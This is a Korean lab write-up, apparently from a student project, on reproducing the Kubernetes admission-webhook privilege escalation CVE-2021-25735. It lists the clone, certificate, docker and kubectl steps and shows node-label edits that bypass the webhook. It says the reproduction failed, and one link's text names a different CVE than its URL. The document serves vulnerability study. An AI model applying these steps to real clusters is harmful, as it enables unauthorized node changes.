
# 취약점 설명

권한 상승 취약점 
Admission Webhook을 통해 기존의 권한으로는 할 수 없었던 노드 구성 변경이 가능 

</br>
</br>

# 취약점 구현
## 구현 환경
### Ubuntu 22.04 , Docker 20.10.13 , Kubernetes v1.19


필요한 자료를 우선 clone해온다

    git clone https://github.com/darryk10/CVE-2021-25735.git
    
    
가져온 자료로 인증용 키 값을 만든다

     bash gencerts.sh

Dockerfile로 빌드를 하거나 기존 Docker Hub에 올라간 image를 사용한다.


    docker login
    docker build -t validationwebhook:1.0 .
    docker tag validationwebhook:1.0 darryk/dev:1.0
    docker push darryk/dev:1.0

webhook-deploy를 kubernetes에 배포한다. 

    kubectl apply -f webhook-deploy.yaml

base64를 통해 키 값을 얻는다.

    cat ca.crt | base64

위에 값으로 webhook-registration안의 값을 수정한 뒤 배포한다


    kubectl apply -f webhook-registration.yaml


노드 라벨을 변경하게 되면


    kubectl edit nodes [노드이름]

      labels:  
        test: test  
        changeAllowed: "false"
        
        
이러한 오류가 발생할 것이다.

error: nodes "ip-172-20-46-130.[노드 이름]" could not be patched: admission webhook "validationwebhook.validationwebhook.svc" denied the request: Validation failed You can run kubectl replace -f /tmp/kubectl-edit-irc64.yaml to try this update again.

그러나 라벨을 이렇게 변경하게 되면

      labels:  
        test: test  
        changeAllowed: "true"
        
원래의 권한으로는 변경할 수 없던 노드를 변경할 수 있게 되는 취약점    

![화면 캡처 2023-06-13 221658](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/df91d812-6aa3-4349-a9f8-94a53c4d7e82)

[https://github.com/discordianfish/cve-2022-0185-crash-poc](https://github.com/darryk10/CVE-2021-25735)
의 코드를 참고하여 빌드하였으나 kubernetes 네트워크가 낮은 버전이 잘 동작하지 않아서 실패
